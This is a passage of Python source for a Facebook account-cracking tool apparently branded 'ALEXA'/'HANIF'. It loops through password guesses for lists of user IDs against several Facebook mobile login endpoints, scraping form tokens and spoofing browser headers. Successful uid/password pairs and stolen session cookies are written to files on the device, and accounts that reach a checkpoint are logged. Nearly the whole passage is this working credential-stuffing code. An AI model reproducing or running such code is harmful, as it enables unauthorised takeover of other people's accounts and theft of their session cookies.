	request_link="https://free.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8"
	refar='https://free.facebook.com/'
if HANIF_Brand in ['m']:
	frist__link='https://m.facebook.com'
	HANIFboss='m.facebook.com'
	request_link="https://m.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8"
	refar='https://m.facebook.com/'
if HANIF_Brand in ['mbasic']:
	frist__link='https://mbasic.facebook.com'
	HANIFboss='mbasic.facebook.com'
	request_link="https://mbasic.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8"
	refar='https://mbasic.facebook.com/'
if HANIF_Brand in ['p']:
	frist__link='https://p.facebook.com'
	HANIFboss='p.facebook.com'
	request_link="https://p.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8"
	refar='https://p.facebook.com/'
if HANIF_Brand in ['x']:
	frist__link='https://x.facebook.com'
	HANIFboss='x.facebook.com'
	request_link="https://x.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8"
	refar='https://x.facebook.com/'
if HANIF_Brand in ['web']:
	frist__link='https://free.facebook.com'
	HANIFboss='web.facebook.com'
	request_link="https://web.facebook.com/login/device-based/regular/login/?refsrc"
	refar='https://web.facebook.com/'


def programmer_HANIF(uid,pwx,tl):
    global loop
    global cps
    global oks
    global proxy
    try:
        for ps in pwx:
            pro = random.choice(_MAHI_)
            session = requests.Session()
            free_fb = session.get(frist__link).text
            log_data = {
                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":uid,
            "pass":ps,
            "login":"Log In"}
            header_freefb = {"authority": HANIFboss,
            "method": 'GET',
            "scheme": 'https',
            "accept": 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.8',
            "accept-encoding": 'gzip, deflate, br',
            "accept-language": 'en-US,en;q=1',
            'cache-control': 'no-cache, no-store, must-revalidate',
            "referer": refar,
            "sec-ch-ua": '"Google Chrome";v="90", "Not)A;Brand";v="8", "Chromium";v="75"',
            "sec-ch-ua-mobile": '?0',
            "sec-ch-ua-platform": "Windows",
            "sec-fetch-dest": 'document',
            "sec-fetch-mode": 'navigate',
            "sec-fetch-site": 'same-origin',
            "sec-fetch-user": '?1',
            "pragma": 'no-cache',
            "priority": 'u=1',
            'cross-origin-resource-policy': 'cross-origin',
            "upgrade-insecure-requests": '1',
            "user-agent": pro}
            lo = session.post(request_link,data=log_data,headers=header_freefb).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[7:22]
                print(f"\033[38;5;46m[🐼] ___\033[38;5;46m[𝑬𝑴𝑳\033[1;37m/\033[1;30m𝑷𝑨𝑺]\033[1;31m>\033[38;5;46m  {uid} | {ps}")
                print(f"\033[1;30m[\033[1;31m\033[1;47m𝘾𝙊𝙊𝙆𝙄𝙀\033[00m\033[1;30m]\033[1;37m= \033[38;5;46m{coki}\n\033[0;90m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[0;97m\n ")
                create_audio("Congratulations ,I got a ok id","test1181.mp3")
                play_audio("test1181.mp3")
                open('/sdcard/𝑨𝒍𝒆𝒙𝒂_𝑶𝑲.txt', 'a').write( uid+' | '+ps+'\n')
                open('/sdcard/𝐀𝐥𝐄𝐗𝐀_𝐂𝐎𝐎𝐊𝐄.txt', 'a').write( coki+'\n\n')
                oks.append(uid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                create_audio("I love you ","test81.mp3")
                play_audio("test81.mp3")
                
                cps.append(uid)
                break
            else:
                continue
        loop+=1
        colr=random.choice(['\033[1;31m','\033[1;32m','\033[1;33m','\033[1;35m','\033[1;34m','\033[1;36m','\033[1;37m','\x1b[38;5;208m'])
        colo=random.choice(['\033[1;31m','\033[1;32m','\033[1;33m','\033[1;35m','\033[1;34m','\033[1;36m','\033[1;37m','\x1b[38;5;208m'])
        emoji=random.choice(['👌','😆','🐸','🙃','😈','🖕','🦅','🦉','🍎','🐝','🦟','🧐','😐','🙂','🤐','♥️','😘','😻','😍','😹','🤣','😂','😭','😁','😜','🤫','😶','🥱','😤','🥵','😇','💋','🙈','🙀','💚','💛','🖤','🤎','💙','💜','🦶','🙆','🌺','🌸','🏵️','🍁','🌼','🔥','🐍','🦡','✈️','🦛','🦐','🐇','🐮','🐰','🦃','🕸️','🦋','🍒','🍓','🍑','🍊','🥭','🍍','🍌','🌶️','🥥','🐛','🥕','🍗','🍆','🥐','🧀','🍤','🇧🇩','☠️'])
        colorful=random.choice(['\033[1;31m','\033[1;32m','\033[1;33m','\033[1;35m','\033[1;34m','\033[1;36m','\033[1;37m','\x1b[38;5;208m'])
        sys.stdout.write(f"\r\33[1;90m[{colr}𝐀𝐋𝐄𝐗𝐀\33[1;90m]{colo}✘\33[1;90m[{colorful}{loop}\33[1;90m]-[\33[1;91m{'{:.1%}'.format(loop/int(tl))}\33[1;90m]-\33[1;90m[{emoji}] "),
        sys.stdout.flush()
    except:
        pass


HANIF()